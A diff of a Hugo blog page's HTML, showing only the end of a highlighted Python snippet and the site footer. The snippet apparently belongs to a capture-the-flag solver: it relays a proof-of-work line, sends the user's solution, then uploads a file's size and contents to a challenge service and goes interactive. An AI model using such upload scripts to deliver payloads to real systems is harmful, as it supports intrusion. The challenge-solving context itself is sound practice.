+</span></span><span style="display:flex;"><span>cmd <span style="color:#ff7b72;font-weight:bold">=</span> p<span style="color:#ff7b72;font-weight:bold">.</span>recvline()<span style="color:#ff7b72;font-weight:bold">.</span>strip(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>)<span style="color:#ff7b72;font-weight:bold">.</span>decode(<span style="color:#a5d6ff">&#34;ascii&#34;</span>)
+</span></span><span style="display:flex;"><span>print(cmd)
+</span></span><span style="display:flex;"><span>sol <span style="color:#ff7b72;font-weight:bold">=</span> input(<span style="color:#a5d6ff">&#34;solution: &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendline(sol)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;Size&#34;</span>, str(len(filedata))<span style="color:#ff7b72;font-weight:bold">.</span>encode(<span style="color:#a5d6ff">&#34;ascii&#34;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;File&#34;</span>, filedata)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     bitfriends 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
